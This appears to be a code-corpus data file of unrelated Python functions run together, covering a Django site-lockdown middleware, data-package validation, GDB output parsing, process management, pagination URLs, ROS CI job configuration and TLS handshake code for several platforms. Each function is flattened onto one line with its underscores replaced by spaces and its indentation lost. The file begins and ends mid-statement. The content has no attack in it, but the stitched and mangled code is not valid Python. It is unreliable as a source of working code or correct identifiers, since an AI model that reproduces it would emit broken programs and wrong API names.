: until date = settings . UNTIL DATE if self . after date : after date = self . after date else : after date = settings . AFTER DATE if until date or after date : locked date = False if until date and datetime . datetime . now ( ) < until date : locked date = True if after date and datetime . datetime . now ( ) > after date : locked date = True if not locked date : return None form data = request . POST if request . method == 'POST' else None if self . form : form class = self . form else : form class = get lockdown form ( settings . FORM ) form = form class ( data = form data , * * self . form kwargs ) authorized = False token = session . get ( self . session key ) if hasattr ( form , 'authenticate' ) : if form . authenticate ( token ) : authorized = True elif token is True : authorized = True if authorized and self . logout key and self . logout key in request . GET : if self . session key in session : del session [ self . session key ] querystring = request . GET . copy ( ) del querystring [ self . logout key ] return self . redirect ( request ) # Don't lock down if the user is already authorized for previewing. if authorized : return None if form . is valid ( ) : if hasattr ( form , 'generate token' ) : token = form . generate token ( ) else : token = True session [ self . session key ] = token return self . redirect ( request ) page data = { 'until date' : until date , 'after date' : after date } if not hasattr ( form , 'show form' ) or form . show form ( ) : page data [ 'form' ] = form if self . extra context : page data . update ( self . extra context ) return render ( request , 'lockdown/form.html' , page data )
def redirect ( self , request ) : url = request . path querystring = request . GET . copy ( ) if self . logout key and self . logout key in request . GET : del querystring [ self . logout key ] if querystring : url = '%s?%s' % ( url , querystring . urlencode ( ) ) return Http Response Redirect ( url )
def get descriptor base path ( descriptor ) : # Infer from path/url if isinstance ( descriptor , six . string types ) : if os . path . exists ( descriptor ) : base path = os . path . dirname ( os . path . abspath ( descriptor ) ) else : # suppose descriptor is a URL base path = os . path . dirname ( descriptor ) # Current dir by default else : base path = '.' return base path
def is safe path ( path ) : contains windows var = lambda val : re . match ( r'%.+%' , val ) contains posix var = lambda val : re . match ( r'\$.+' , val ) unsafeness conditions = [ os . path . isabs ( path ) , ( '..%s' % os . path . sep ) in path , path . startswith ( '~' ) , os . path . expandvars ( path ) != path , contains windows var ( path ) , contains posix var ( path ) , ] return not any ( unsafeness conditions )
def validate zip ( the zip ) : datapackage jsons = [ f for f in the zip . namelist ( ) if f . endswith ( 'datapackage.json' ) ] if len ( datapackage jsons ) != 1 : msg = 'Data Package must have only one "datapackage.json" (had {n})' raise exceptions . Data Package Exception ( msg . format ( n = len ( datapackage jsons ) ) )
def validate ( self ) : # Deprecate warnings . warn ( 'Property "package.validate" is deprecated.' , User Warning ) descriptor = self . to dict ( ) self . profile . validate ( descriptor )
def iter errors ( self ) : # Deprecate warnings . warn ( 'Property "package.iter errors" is deprecated.' , User Warning ) return self . profile . iter errors ( self . to dict ( ) )
def iter errors ( self , data ) : # Deprecate warnings . warn ( 'Property "profile.iter errors" is deprecated.' , User Warning ) for error in self . validator . iter errors ( data ) : yield error
def get responses windows ( self , timeout sec ) : timeout time sec = time . time ( ) + timeout sec responses = [ ] while True : try : self . gdb process . stdout . flush ( ) if PYTHON3 : raw output = self . gdb process . stdout . readline ( ) . replace ( b"\r" , b"\n" ) else : raw output = self . gdb process . stdout . read ( ) . replace ( b"\r" , b"\n" ) responses += self . get responses list ( raw output , "stdout" ) except IO Error : pass try : self . gdb process . stderr . flush ( ) if PYTHON3 : raw output = self . gdb process . stderr . readline ( ) . replace ( b"\r" , b"\n" ) else : raw output = self . gdb process . stderr . read ( ) . replace ( b"\r" , b"\n" ) responses += self . get responses list ( raw output , "stderr" ) except IO Error : pass if time . time ( ) > timeout time sec : break return responses
def get responses unix ( self , timeout sec ) : timeout time sec = time . time ( ) + timeout sec responses = [ ] while True : select timeout = timeout time sec - time . time ( ) # I prefer to not pass a negative value to select if select timeout <= 0 : select timeout = 0 events , , = select . select ( self . read list , [ ] , [ ] , select timeout ) responses list = None # to avoid infinite loop if using Python 2 try : for fileno in events : # new data is ready to read if fileno == self . stdout fileno : self . gdb process . stdout . flush ( ) raw output = self . gdb process . stdout . read ( ) stream = "stdout" elif fileno == self . stderr fileno : self . gdb process . stderr . flush ( ) raw output = self . gdb process . stderr . read ( ) stream = "stderr" else : raise Value Error ( "Developer error. Got unexpected file number %d" % fileno ) responses list = self . get responses list ( raw output , stream ) responses += responses list except IO Error : # only occurs in python 2.7 pass if timeout sec == 0 : # just exit immediately break elif responses list and self . allow overwrite timeout times : # update timeout time to potentially be closer to now to avoid lengthy wait times when nothing is being output by gdb timeout time sec = min ( time . time ( ) + self . time to check for additional output sec , timeout time sec , ) elif time . time ( ) > timeout time sec : break return responses
def get notify msg and payload ( result , stream ) : token = stream . advance past chars ( [ "=" , "*" ] ) token = int ( token ) if token != "" else None logger . debug ( "%s" , fmt green ( "parsing message" ) ) message = stream . advance past chars ( [ "," ] ) logger . debug ( "parsed message" ) logger . debug ( "%s" , fmt green ( message ) ) payload = parse dict ( stream ) return token , message . strip ( ) , payload
def get result msg and payload ( result , stream ) : groups = GDB MI RESULT RE . match ( result ) . groups ( ) token = int ( groups [ 0 ] ) if groups [ 0 ] != "" else None message = groups [ 1 ] if groups [ 2 ] is None : payload = None else : stream . advance past chars ( [ "," ] ) payload = parse dict ( stream ) return token , message , payload
def cleanup ( self ) : if self . subscription : logger . info ( "Deleting worker subscription..." ) self . subscriber client . delete subscription ( self . subscription )
def enqueue ( self , f , * args , * * kwargs ) : task = Task ( uuid4 ( ) . hex , f , args , kwargs ) self . storage . put task ( task ) return self . enqueue task ( task )
def service start ( service = None , param = None ) : if service is not None : to run = [ "python" , service ] if param is not None : to run += param return subprocess . Popen ( to run ) return False
def update running pids ( old procs ) : new procs = [ ] for proc in old procs : if proc . poll ( ) is None and check pid ( proc . pid ) : publisher . debug ( str ( proc . pid ) + ' is alive' ) new procs . append ( proc ) else : try : publisher . debug ( str ( proc . pid ) + ' is gone' ) os . kill ( proc . pid , signal . SIGKILL ) except : # the process is just already gone pass return new procs
def fsplit ( file to split ) : dirname = file to split + ' splitted' if not os . path . exists ( dirname ) : os . mkdir ( dirname ) part file size = os . path . getsize ( file to split ) / number of files + 1 splitted files = [ ] with open ( file to split , "r" ) as f : number = 0 actual = 0 while 1 : prec = actual # Jump of "size" from the current place in the file f . seek ( part file size , os . SEEK CUR ) # find the next separator or EOF s = f . readline ( ) if len ( s ) == 0 : s = f . readline ( ) while len ( s ) != 0 and s != separator : s = f . readline ( ) # Get the current place actual = f . tell ( ) new file = os . path . join ( dirname , str ( number ) ) # Create the new file with open ( file to split , "r" ) as temp : temp . seek ( prec ) # Get the text we want to put in the new file copy = temp . read ( actual - prec ) # Write the new file open ( new file , 'w' ) . write ( copy ) splitted files . append ( new file ) number += 1 # End of file if len ( s ) == 0 : break return splitted files
def already downloaded ( filename ) : cur file = os . path . join ( c . bview dir , filename ) old file = os . path . join ( c . bview dir , 'old' , filename ) if not os . path . exists ( cur file ) and not os . path . exists ( old file ) : return False return True
def get page url ( page num , current app , url view name , url extra args , url extra kwargs , url param name , url get params , url anchor ) : if url view name is not None : # Add page param to the kwargs list. Overrides any previously set parameter of the same name. url extra kwargs [ url param name ] = page num try : url = reverse ( url view name , args = url extra args , kwargs = url extra kwargs , current app = current app ) except No Reverse Match as e : # Attempt to load view from application root, allowing the use of non-namespaced view names if your view is defined in the root application if settings . SETTINGS MODULE : if django . VERSION < ( 1 , 9 , 0 ) : separator = '.' else : separator = ':' # Namespace separator changed to colon after 1.8 project name = settings . SETTINGS MODULE . split ( '.' ) [ 0 ] try : url = reverse ( project name + separator + url view name , args = url extra args , kwargs = url extra kwargs , current app = current app ) except No Reverse Match : raise e # Raise the original exception so the error message doesn't confusingly include something the Developer didn't add to the view name themselves else : raise e # We can't determine the project name so just re-throw the exception else : url = '' url get params = url get params or Query Dict ( url ) url get params = url get params . copy ( ) url get params [ url param name ] = str ( page num ) if len ( url get params ) > 0 : if not isinstance ( url get params , Query Dict ) : tmp = Query Dict ( mutable = True ) tmp . update ( url get params ) url get params = tmp url += '?' + url get params . urlencode ( ) if ( url anchor is not None ) : url += '#' + url anchor return url
def configure ci jobs ( config url , rosdistro name , ci build name , groovy script = None , dry run = False ) : config = get config index ( config url ) build files = get ci build files ( config , rosdistro name ) build file = build files [ ci build name ] index = get index ( config . rosdistro index url ) # get targets targets = [ ] for os name in build file . targets . keys ( ) : for os code name in build file . targets [ os name ] . keys ( ) : for arch in build file . targets [ os name ] [ os code name ] : targets . append ( ( os name , os code name , arch ) ) print ( 'The build file contains the following targets:' ) for os name , os code name , arch in targets : print ( '  -' , os name , os code name , arch ) dist file = get distribution file ( index , rosdistro name , build file ) if not dist file : print ( 'No distribution file matches the build file' ) return ci view name = get ci view name ( rosdistro name ) # all further configuration will be handled by either the Jenkins API # or by a generated groovy script from ros buildfarm . jenkins import connect jenkins = connect ( config . jenkins url ) if groovy script is None else False view configs = { } views = { ci view name : configure ci view ( jenkins , ci view name , dry run = dry run ) } if not jenkins : view configs . update ( views ) groovy data = { 'dry run' : dry run , 'expected num views' : len ( view configs ) , } ci job names = [ ] job configs = Ordered Dict ( ) is disabled = False for os name , os code name , arch in targets : try : job name , job config = configure ci job ( config url , rosdistro name , ci build name , os name , os code name , arch , config = config , build file = build file , index = index , dist file = dist file , jenkins = jenkins , views = views , is disabled = is disabled , groovy script = groovy script , dry run = dry run , trigger timer = build file . jenkins job schedule ) ci job names . append ( job name ) if groovy script is not None : print ( "Configuration for job '%s'" % job name ) job configs [ job name ] = job config except Job Validation Error as e : print ( e . message , file = sys . stderr ) groovy data [ 'expected num jobs' ] = len ( job configs ) groovy data [ 'job prefixes and names' ] = { } if groovy script is not None : print ( "Writing groovy script '%s' to reconfigure %d jobs" % ( groovy script , len ( job configs ) ) ) content = expand template ( 'snippet/reconfigure jobs.groovy.em' , groovy data ) write groovy script and configs ( groovy script , content , job configs , view configs )
def obtain credentials ( self ) : protocol values = { 'SS Lv3' : Secur32Const . SP PROT SSL3 CLIENT , 'TL Sv1' : Secur32Const . SP PROT TLS1 CLIENT , 'TL Sv1.1' : Secur32Const . SP PROT TLS1 1 CLIENT , 'TL Sv1.2' : Secur32Const . SP PROT TLS1 2 CLIENT , } protocol bit mask = 0 for key , value in protocol values . items ( ) : if key in self . protocols : protocol bit mask |= value algs = [ Secur32Const . CALG AES 128 , Secur32Const . CALG AES 256 , Secur32Const . CALG 3DES , Secur32Const . CALG SHA1 , Secur32Const . CALG ECDHE , Secur32Const . CALG DH EPHEM , Secur32Const . CALG RSA KEYX , Secur32Const . CALG RSA SIGN , Secur32Const . CALG ECDSA , Secur32Const . CALG DSS SIGN , ] if 'TL Sv1.2' in self . protocols : algs . extend ( [ Secur32Const . CALG SHA512 , Secur32Const . CALG SHA384 , Secur32Const . CALG SHA256 , ] ) alg array = new ( secur32 , 'ALG ID[%s]' % len ( algs ) ) for index , alg in enumerate ( algs ) : alg array [ index ] = alg flags = Secur32Const . SCH USE STRONG CRYPTO | Secur32Const . SCH CRED NO DEFAULT CREDS if not self . manual validation and not self . extra trust roots : flags |= Secur32Const . SCH CRED AUTO CRED VALIDATION else : flags |= Secur32Const . SCH CRED MANUAL CRED VALIDATION schannel cred pointer = struct ( secur32 , 'SCHANNEL CRED' ) schannel cred = unwrap ( schannel cred pointer ) schannel cred . dw Version = Secur32Const . SCHANNEL CRED VERSION schannel cred . c Creds = 0 schannel cred . pa Cred = null ( ) schannel cred . h Root Store = null ( ) schannel cred . c Mappers = 0 schannel cred . aph Mappers = null ( ) schannel cred . c Supported Algs = len ( alg array ) schannel cred . palg Supported Algs = alg array schannel cred . grbit Enabled Protocols = protocol bit mask schannel cred . dw Minimum Cipher Strength = 0 schannel cred . dw Maximum Cipher Strength = 0 # Default session lifetime is 10 hours schannel cred . dw Session Lifespan = 0 schannel cred . dw Flags = flags schannel cred . dw Cred Format = 0 cred handle pointer = new ( secur32 , 'Cred Handle *' ) result = secur32 . Acquire Credentials Handle W ( null ( ) , Secur32Const . UNISP NAME , Secur32Const . SECPKG CRED OUTBOUND , null ( ) , schannel cred pointer , null ( ) , null ( ) , cred handle pointer , null ( ) ) handle error ( result ) self . credentials handle = cred handle pointer
def close ( self ) : try : self . shutdown ( ) finally : if self . socket : try : self . socket . close ( ) except ( socket . error ) : pass self . socket = None
def handshake ( self ) : self . ssl = None self . rbio = None self . wbio = None try : self . ssl = libssl . SSL new ( self . session . ssl ctx ) if is null ( self . ssl ) : self . ssl = None handle openssl error ( 0 ) mem bio = libssl . BIO s mem ( ) self . rbio = libssl . BIO new ( mem bio ) if is null ( self . rbio ) : handle openssl error ( 0 ) self . wbio = libssl . BIO new ( mem bio ) if is null ( self . wbio ) : handle openssl error ( 0 ) libssl . SSL set bio ( self . ssl , self . rbio , self . wbio ) utf8 domain = self . hostname . encode ( 'utf-8' ) libssl . SSL ctrl ( self . ssl , Libssl Const . SSL CTRL SET TLSEXT HOSTNAME , Libssl Const . TLSEXT NAMETYPE host name , utf8 domain ) libssl . SSL set connect state ( self . ssl ) if self . session . ssl session : libssl . SSL set session ( self . ssl , self . session . ssl session ) self . bio write buffer = buffer from bytes ( self . buffer size ) self . read buffer = buffer from bytes ( self . buffer size ) handshake server bytes = b'' handshake client bytes = b'' while True : result = libssl . SSL do handshake ( self . ssl ) handshake client bytes += self . raw write ( ) if result == 1 : break error = libssl . SSL get error ( self . ssl , result ) if error == Libssl Const . SSL ERROR WANT READ : chunk = self . raw read ( ) if chunk == b'' : if handshake server bytes == b'' : raise disconnection ( ) if detect client auth request ( handshake server bytes ) : raise client auth ( ) raise protocol error ( handshake server bytes ) handshake server bytes += chunk elif error == Libssl Const . SSL ERROR WANT WRITE : handshake client bytes += self . raw write ( ) elif error == Libssl Const . SSL ERROR ZERO RETURN : self . gracefully closed = True self . shutdown ( False ) self . raise closed ( ) else : info = peek openssl error ( ) if libcrypto version info < ( 1 , 1 ) : dh key info = ( 20 , Libssl Const . SSL F SSL3 CHECK CERT AND ALGORITHM , Libssl Const . SSL R DH KEY TOO SMALL ) else : dh key info = ( 20 , Libssl Const . SSL F TLS PROCESS SKE DHE , Libssl Const . SSL R DH KEY TOO SMALL ) if info == dh key info : raise dh params ( ) if libcrypto version info < ( 1 , 1 ) : unknown protocol info = ( 20 , Libssl Const . SSL F SSL23 GET SERVER HELLO , Libssl Const . SSL R UNKNOWN PROTOCOL ) else : unknown protocol info = ( 20 , Libssl Const . SSL F SSL3 GET RECORD , Libssl Const . SSL R WRONG VERSION NUMBER ) if info == unknown protocol info : raise protocol error ( handshake server bytes ) tls version info error = ( 20 , Libssl Const . SSL F SSL23 GET SERVER HELLO , Libssl Const . SSL R TLSV1 ALERT PROTOCOL VERSION ) if info == tls version info error : raise protocol version ( ) handshake error info = ( 20 , Libssl Const . SSL F SSL23 GET SERVER HELLO , Libssl Const . SSL R SSLV3 ALERT HANDSHAKE FAILURE ) if info == handshake error info : raise handshake ( ) handshake failure info = ( 20 , Libssl Const . SSL F SSL3 READ BYTES , Libssl Const . SSL R SSLV3 ALERT HANDSHAKE FAILURE ) if info == handshake failure info : raise client auth ( ) if libcrypto version info < ( 1 , 1 ) : cert verify failed info = ( 20 , Libssl Const . SSL F SSL3 GET SERVER CERTIFICATE , Libssl Const . SSL R CERTIFICATE VERIFY FAILED ) else : cert verify failed info = ( 20 , Libssl Const . SSL F TLS PROCESS SERVER CERTIFICATE , Libssl Const . SSL R CERTIFICATE VERIFY FAILED ) if info == cert verify failed info : verify result = libssl . SSL get verify result ( self . ssl ) chain = extract chain ( handshake server bytes ) self signed = False time invalid = False no issuer = False cert = None oscrypto cert = None if chain : cert = chain [ 0 ] oscrypto cert = load certificate ( cert ) self signed = oscrypto cert . self signed issuer error codes = set ( [ Libssl Const . X509 V ERR DEPTH ZERO SELF SIGNED CERT , Libssl Const . X509 V ERR SELF SIGNED CERT IN CHAIN , Libssl Const . X509 V ERR UNABLE TO GET ISSUER CERT LOCALLY ] ) if verify result in issuer error codes : no issuer = not self signed time error codes = set ( [ Libssl Const . X509 V ERR CERT HAS EXPIRED , Libssl Const . X509 V ERR CERT NOT YET VALID ] ) time invalid = verify result in time error codes if time invalid : raise expired not yet valid ( cert ) if no issuer : raise no issuer ( cert ) if self signed : raise self signed ( cert ) if oscrypto cert and oscrypto cert . asn1 . hash algo in set ( [ 'md5' , 'md2' ] ) : raise weak signature ( oscrypto cert ) raise verification ( cert ) handle openssl error ( 0 , TLS Error ) session info = parse session info ( handshake server bytes , handshake client bytes ) self . protocol = session info [ 'protocol' ] self . cipher suite = session info [ 'cipher suite' ] self . compression = session info [ 'compression' ] self . session id = session info [ 'session id' ] self . session ticket = session info [ 'session ticket' ] if self . cipher suite . find ( ' DHE ' ) != - 1 : dh params length = get dh params length ( handshake server bytes ) if dh params length < 1024 : self . close ( ) raise dh params ( ) # When saving the session for future requests, we use # SSL get1 session() variant to increase the reference count. This # prevents the session from being freed when one connection closes # before another is opened. However, since we increase the ref # count, we also have to explicitly free any previous session. if self . session id == 'new' or self . session ticket == 'new' : if self . session . ssl session : libssl . SSL SESSION free ( self . session . ssl session ) self . session . ssl session = libssl . SSL get1 session ( self . ssl ) if not self . session . manual validation : if self . certificate . hash algo in set ( [ 'md5' , 'md2' ] ) : raise weak signature ( self . certificate ) # Open SSL does not do hostname or IP address checking in the end # entity certificate, so we must perform that check if not self . certificate . is valid domain ip ( self . hostname ) : raise hostname ( self . certificate , self . hostname ) except ( OS Error , socket . error ) : if self . ssl : libssl . SSL free ( self . ssl ) self . ssl = None self . rbio = None self . wbio = None # The BI Os are freed by SSL free(), so we only need to free # them if for some reason SSL free() was not called else : if self . rbio : libssl . BIO free ( self . rbio ) self . rbio = None if self . wbio : libssl . BIO free ( self . wbio ) self . wbio = None self . close ( ) raise
def handshake ( self ) : session context = None ssl policy ref = None crl search ref = None crl policy ref = None ocsp search ref = None ocsp policy ref = None policy array ref = None try : if osx version info < ( 10 , 8 ) : session context pointer = new ( Security , 'SSL Context Ref *' ) result = Security . SSL New Context ( False , session context pointer ) handle sec error ( result ) session context = unwrap ( session context pointer ) else : session context = Security . SSL Create Context ( null ( ) , Security Const . k SSL Client Side , Security Const . k SSL Stream Type ) result = Security . SSL Set IO Funcs ( session context , read callback pointer , write callback pointer ) handle sec error ( result ) self . connection id = id ( self ) % 2147483647 connection refs [ self . connection id ] = self socket refs [ self . connection id ] = self . socket result = Security . SSL Set Connection ( session context , self . connection id ) handle sec error ( result ) utf8 domain = self . hostname . encode ( 'utf-8' ) result = Security . SSL Set Peer Domain Name ( session context , utf8 domain , len ( utf8 domain ) ) handle sec error ( result ) if osx version info >= ( 10 , 10 ) : disable auto validation = self . session . manual validation or self . session . extra trust roots explicit validation = ( not self . session . manual validation ) and self . session . extra trust roots else : disable auto validation = True explicit validation = not self . session . manual validation # Ensure requested protocol support is set for the session if osx version info < ( 10 , 8 ) : for protocol in [ 'SS Lv2' , 'SS Lv3' , 'TL Sv1' ] : protocol const = PROTOCOL STRING CONST MAP [ protocol ] enabled = protocol in self . session . protocols result = Security . SSL Set Protocol Version Enabled ( session context , protocol const , enabled ) handle sec error ( result ) if disable auto validation : result = Security . SSL Set Enable Cert Verify ( session context , False ) handle sec error ( result ) else : protocol consts = [ PROTOCOL STRING CONST MAP [ protocol ] for protocol in self . session . protocols ] min protocol = min ( protocol consts ) max protocol = max ( protocol consts ) result = Security . SSL Set Protocol Version Min ( session context , min protocol ) handle sec error ( result ) result = Security . SSL Set Protocol Version Max ( session context , max protocol ) handle sec error ( result ) if disable auto validation : result = Security . SSL Set Session Option ( session context , Security Const . k SSL Session Option Break On Server Auth , True ) handle sec error ( result ) # Disable all sorts of bad cipher suites supported ciphers pointer = new ( Security , 'size t *' ) result = Security . SSL Get Number Supported Ciphers ( session context , supported ciphers pointer ) handle sec error ( result ) supported ciphers = deref ( supported ciphers pointer ) cipher buffer = buffer from bytes ( supported ciphers * 4 ) supported cipher suites pointer = cast ( Security , 'uint32 t *' , cipher buffer ) result = Security . SSL Get Supported Ciphers ( session context , supported cipher suites pointer , supported ciphers pointer ) handle sec error ( result ) supported ciphers = deref ( supported ciphers pointer ) supported cipher suites = array from pointer ( Security , 'uint32 t' , supported cipher suites pointer , supported ciphers ) good ciphers = [ ] for supported cipher suite in supported cipher suites : cipher suite = int to bytes ( supported cipher suite , width = 2 ) cipher suite name = CIPHER SUITE MAP . get ( cipher suite , cipher suite ) good cipher = cipher blacklist regex . search ( cipher suite name ) is None if good cipher : good ciphers . append ( supported cipher suite ) num good ciphers = len ( good ciphers ) good ciphers array = new ( Security , 'uint32 t[]' , num good ciphers ) array set ( good ciphers array , good ciphers ) good ciphers pointer = cast ( Security , 'uint32 t *' , good ciphers array ) result = Security . SSL Set Enabled Ciphers ( session context , good ciphers pointer , num good ciphers ) handle sec error ( result ) # Set a peer id from the session to allow for session reuse, the hostname # is appended to prevent a bug on OS X 10.7 where it tries to reuse a # connection even if the hostnames are different. peer id = self . session . peer id + self . hostname . encode ( 'utf-8' ) result = Security . SSL Set Peer ID ( session context , peer id , len ( peer id ) ) handle sec error ( result ) handshake result = Security . SSL Handshake ( session context ) if self . exception is not None : exception = self . exception self . exception = None raise exception while handshake result == Security Const . err SSL Would Block : handshake result = Security . SSL Handshake ( session context ) if self . exception is not None : exception = self . exception self . exception = None raise exception if osx version info < ( 10 , 8 ) and osx version info >= ( 10 , 7 ) : do validation = explicit validation and handshake result == 0 else : do validation = explicit validation and handshake result == Security Const . err SSL Server Auth Completed if do validation : trust ref pointer = new ( Security , 'Sec Trust Ref *' ) result = Security . SSL Copy Peer Trust ( session context , trust ref pointer ) handle sec error ( result ) trust ref = unwrap ( trust ref pointer ) cf string hostname = CF Helpers . cf string from unicode ( self . hostname ) ssl policy ref = Security . Sec Policy Create SSL ( True , cf string hostname ) result = Core Foundation . CF Release ( cf string hostname ) handle cf error ( result ) # Create a new policy for OCSP checking to disable it ocsp oid pointer = struct ( Security , 'CSSM OID' ) ocsp oid = unwrap ( ocsp oid pointer ) ocsp oid . Length = len ( Security Const . APPLE TP REVOCATION OCSP ) ocsp oid buffer = buffer from bytes ( Security Const . APPLE TP REVOCATION OCSP ) ocsp oid . Data = cast ( Security , 'char *' , ocsp oid buffer ) ocsp search ref pointer = new ( Security , 'Sec Policy Search Ref *' ) result = Security . Sec Policy Search Create ( Security Const . CSSM CERT X 509v3 , ocsp oid pointer , null ( ) , ocsp search ref pointer ) handle sec error ( result ) ocsp search ref = unwrap ( ocsp search ref pointer ) ocsp policy ref pointer = new ( Security , 'Sec Policy Ref *' ) result = Security . Sec Policy Search Copy Next ( ocsp search ref , ocsp policy ref pointer ) handle sec error ( result ) ocsp policy ref = unwrap ( ocsp policy ref pointer ) ocsp struct pointer = struct ( Security , 'CSSM APPLE TP OCSP OPTIONS' ) ocsp struct = unwrap ( ocsp struct pointer ) ocsp struct . Version = Security Const . CSSM APPLE TP OCSP OPTS VERSION ocsp struct . Flags = ( Security Const . CSSM TP ACTION OCSP DISABLE NET | Security Const . CSSM TP ACTION OCSP CACHE READ DISABLE ) ocsp struct bytes = struct bytes ( ocsp struct pointer ) cssm data pointer = struct ( Security , 'CSSM DATA' ) cssm data = unwrap ( cssm data pointer ) cssm data . Length = len ( ocsp struct bytes ) ocsp struct buffer = buffer from bytes ( ocsp struct bytes ) cssm data . Data = cast ( Security , 'char *' , ocsp struct buffer ) result = Security . Sec Policy Set Value ( ocsp policy ref , cssm data pointer ) handle sec error ( result ) # Create a new policy for CRL checking to disable it crl oid pointer = struct ( Security , 'CSSM OID' ) crl oid = unwrap ( crl oid pointer ) crl oid . Length = len ( Security Const . APPLE TP REVOCATION CRL ) crl oid buffer = buffer from bytes ( Security Const . APPLE TP REVOCATION CRL ) crl oid . Data = cast ( Security , 'char *' , crl oid buffer ) crl search ref pointer = new ( Security , 'Sec Policy Search Ref *' ) result = Security . Sec Policy Search Create ( Security Const . CSSM CERT X 509v3 , crl oid pointer , null ( ) , crl search ref pointer ) handle sec error ( result ) crl search ref = unwrap ( crl search ref pointer ) crl policy ref pointer = new ( Security , 'Sec Policy Ref *' ) result = Security . Sec Policy Search Copy Next ( crl search ref , crl policy ref pointer ) handle sec error ( result ) crl policy ref = unwrap ( crl policy ref pointer ) crl struct pointer = struct ( Security , 'CSSM APPLE TP CRL OPTIONS' ) crl struct = unwrap ( crl struct pointer ) crl struct . Version = Security Const . CSSM APPLE TP CRL OPTS VERSION crl struct . Crl Flags = 0 crl struct bytes = struct bytes ( crl struct pointer ) cssm data pointer = struct ( Security , 'CSSM DATA' ) cssm data = unwrap ( cssm data pointer ) cssm data . Length = len ( crl struct bytes ) crl struct buffer = buffer from bytes ( crl struct bytes ) cssm data . Data = cast ( Security , 'char *' , crl struct buffer ) result = Security . Sec Policy Set Value ( crl policy ref , cssm data pointer ) handle sec error ( result ) policy array ref = CF Helpers . cf array from list ( [ ssl policy ref , crl policy ref , ocsp policy ref ] ) result = Security . Sec Trust Set Policies ( trust ref , policy array ref ) handle sec error ( result ) if self . session . extra trust roots : ca cert refs = [ ] ca certs = [ ] for cert in self . session . extra trust roots : ca cert = load certificate ( cert ) ca certs . append ( ca cert ) ca cert refs . append ( ca cert . sec certificate ref ) result = Security . Sec Trust Set Anchor Certificates Only ( trust ref , False ) handle sec error ( result ) array ref = CF Helpers . cf array from list ( ca cert refs ) result = Security . Sec Trust Set Anchor Certificates ( trust ref , array ref ) handle sec error ( result ) result pointer = new ( Security , 'Sec Trust Result Type *' ) result = Security . Sec Trust Evaluate ( trust ref , result pointer ) handle sec error ( result ) trust result code = deref ( result pointer ) invalid chain error codes = set ( [ Security Const . k Sec Trust Result Proceed , Security Const . k Sec Trust Result Unspecified ] ) if trust result code not in invalid chain error codes : handshake result = Security Const . err SSLX Cert Chain Invalid else : handshake result = Security . SSL Handshake ( session context ) while handshake result == Security Const . err SSL Would Block : handshake result = Security . SSL Handshake ( session context ) self . done handshake = True handshake error codes = set ( [ Security Const . err SSLX Cert Chain Invalid , Security Const . err SSL Cert Expired , Security Const . err SSL Cert Not Yet Valid , Security Const . err SSL Unknown Root Cert , Security Const . err SSL No Root Cert , Security Const . err SSL Host Name Mismatch , Security Const . err SSL Internal , ] ) # In testing, only err SSLX Cert Chain Invalid was ever returned for # all of these different situations, however we include the others # for completeness. To get the real reason we have to use the # certificate from the handshake and use the deprecated function # Sec Trust Get Cssm Result Code(). if handshake result in handshake error codes : trust ref pointer = new ( Security , 'Sec Trust Ref *' ) result = Security . SSL Copy Peer Trust ( session context , trust ref pointer ) handle sec error ( result ) trust ref = unwrap ( trust ref pointer ) result code pointer = new ( Security , 'OS Status *' ) result = Security . Sec Trust Get Cssm Result Code ( trust ref , result code pointer ) result code = deref ( result code pointer ) chain = extract chain ( self . server hello ) self signed = False revoked = False expired = False not yet valid = False no issuer = False cert = None bad hostname = False if chain : cert = chain [ 0 ] oscrypto cert = load certificate ( cert ) self signed = oscrypto cert . self signed revoked = result code == Security Const . CSSMERR TP CERT REVOKED no issuer = not self signed and result code == Security Const . CSSMERR TP NOT TRUSTED expired = result code == Security Const . CSSMERR TP CERT EXPIRED not yet valid = result code == Security Const . CSSMERR TP CERT NOT VALID YET bad hostname = result code == Security Const . CSSMERR APPLETP HOSTNAME MISMATCH # On mac OS 10.12, some expired certificates return err SSL Internal if osx version info >= ( 10 , 12 ) : validity = cert [ 'tbs certificate' ] [ 'validity' ] not before = validity [ 'not before' ] . chosen . native not after = validity [ 'not after' ] . chosen . native utcnow = datetime . datetime . now ( timezone . utc ) expired = not after < utcnow not yet valid = not before > utcnow if chain and chain [ 0 ] . hash algo in set ( [ 'md5' , 'md2' ] ) : raise weak signature ( chain [ 0 ] ) if revoked : raise revoked ( cert ) if bad hostname : raise hostname ( cert , self . hostname ) elif expired or not yet valid : raise expired not yet valid ( cert ) elif no issuer : raise no issuer ( cert ) elif self signed : raise self signed ( cert ) if detect client auth request ( self . server hello ) : raise client auth ( ) raise verification ( cert ) if handshake result == Security Const . err SSL Peer Handshake Fail : if detect client auth request ( self . server hello ) : raise client auth ( ) raise handshake ( ) if handshake result == Security Const . err SSL Weak Peer Ephemeral DH Key : raise dh params ( ) if handshake result == Security Const . err SSL Peer Protocol Version : raise protocol version ( ) if handshake result in set ( [ Security Const . err SSL Record Overflow , Security Const . err SSL Protocol ] ) : self . server hello += read remaining ( self . socket ) raise protocol error ( self . server hello ) if handshake result in set ( [ Security Const . err SSL Closed No Notify , Security Const . err SSL Closed Abort ] ) : if not self . done handshake : self . server hello += read remaining ( self . socket ) if detect other protocol ( self . server hello ) : raise protocol error ( self . server hello ) raise disconnection ( ) if osx version info < ( 10 , 10 ) : dh params length = get dh params length ( self . server hello ) if dh params length is not None and dh params length < 1024 : raise dh params ( ) would block = handshake result == Security Const . err SSL Would Block server auth complete = handshake result == Security Const . err SSL Server Auth Completed manual validation = self . session . manual validation and server auth complete if not would block and not manual validation : handle sec error ( handshake result , TLS Error ) self . session context = session context protocol const pointer = new ( Security , 'SSL Protocol *' ) result = Security . SSL Get Negotiated Protocol Version ( session context , protocol const pointer ) handle sec error ( result ) protocol const = deref ( protocol const pointer ) self . protocol = PROTOCOL CONST STRING MAP [ protocol const ] cipher int pointer = new ( Security , 'SSL Cipher Suite *' ) result = Security . SSL Get Negotiated Cipher ( session context , cipher int pointer ) handle sec error ( result ) cipher int = deref ( cipher int pointer ) cipher bytes = int to bytes ( cipher int , width = 2 ) self . cipher suite = CIPHER SUITE MAP . get ( cipher bytes , cipher bytes ) session info = parse session info ( self . server hello , self . client hello ) self . compression = session info [ 'compression' ] self . session id = session info [ 'session id' ] self . session ticket = session info [ 'session ticket' ] except ( OS Error , socket . error ) : if session context : if osx version info < ( 10 , 8 ) : result = Security . SSL Dispose Context ( session context ) handle sec error ( result ) else : result = Core Foundation . CF Release ( session context ) handle cf error ( result ) self . session context = None self . close ( ) raise finally : # Trying to release crl search ref or ocsp search ref results in # a segmentation fault, so we do not do that if ssl policy ref : result = Core Foundation . CF Release ( ssl policy ref ) handle cf error ( result ) ssl policy ref = 